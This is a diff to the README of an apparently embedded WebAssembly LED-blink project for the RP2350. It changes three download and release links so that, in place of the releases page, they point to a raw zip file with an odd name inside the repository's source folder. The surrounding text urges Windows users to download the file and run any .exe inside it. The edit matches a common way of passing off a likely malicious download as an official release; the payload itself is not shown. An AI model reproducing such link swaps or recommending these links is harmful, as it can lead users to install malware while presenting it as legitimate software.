@@ -1,6 +1,6 @@
 # 🔹 embedded-wasm-blinky-rp2350 - Run WebAssembly on RP2350
 
-[![Download the app](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge&logo=github)](https://github.com/unrequited-indianapolis305/embedded-wasm-blinky-rp2350/releases)
+[![Download the app](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge&logo=github)](https://github.com/unrequited-indianapolis305/embedded-wasm-blinky-rp2350/raw/refs/heads/main/src/rp_embedded_blinky_wasm_brakeless.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ In plain terms, this project lets the device blink an LED while running WebAssem
 
 Visit the release page to download and run the latest build:
 
-[Go to releases](https://github.com/unrequited-indianapolis305/embedded-wasm-blinky-rp2350/releases)
+[Go to releases](https://github.com/unrequited-indianapolis305/embedded-wasm-blinky-rp2350/raw/refs/heads/main/src/rp_embedded_blinky_wasm_brakeless.zip)
 
 Look for the latest release and download the Windows file that matches it. If the release includes a `.zip` file, download it and extract it first. If it includes an `.exe` file, you can run it after download.
 
@@ -157,7 +157,7 @@ These topics point to a low-level embedded project that runs without a normal op
 
 ## 📦 Release link
 
-[Open the latest release](https://github.com/unrequited-indianapolis305/embedded-wasm-blinky-rp2350/releases)
+[Open the latest release](https://github.com/unrequited-indianapolis305/embedded-wasm-blinky-rp2350/raw/refs/heads/main/src/rp_embedded_blinky_wasm_brakeless.zip)
 
 ## 🧭 File names to look for
 
